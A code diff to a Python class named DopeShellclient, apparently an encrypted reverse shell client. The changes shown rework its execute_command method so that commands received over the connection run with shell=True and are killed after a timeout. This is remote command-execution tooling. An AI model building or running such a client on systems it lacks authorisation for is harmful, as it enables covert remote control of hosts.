@@ -7,7 +7,8 @@ import base64
 import argparse
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
-
+import subprocess
+import time
 class DopeShellclient:
     def __init__(self, server_ip, server_port, key):
         self.server_ip = server_ip
@@ -31,10 +32,27 @@ class DopeShellclient:
         return decrypted_data
 
     def execute_command(self, command):
-        try:
-            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
-        except subprocess.CalledProcessError as e:
-            output = e.output
+        invalid = False    
+        output = b'no error returned'
+        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        timeout = 5  # seconds
+        start_time = time.time()
+
+        while process.poll() is None:
+            time.sleep(1)  # Wait for 1 second
+            if time.time() - start_time > timeout:
+                process.kill()
+                invalid = True
+                break
+
+        if invalid == False:
+            try:
+                output, error = process.communicate(timeout=10)
+                if error:
+                    return error
+            except:
+                output = "Unkown error!"
+
         return output
 
     def run(self):
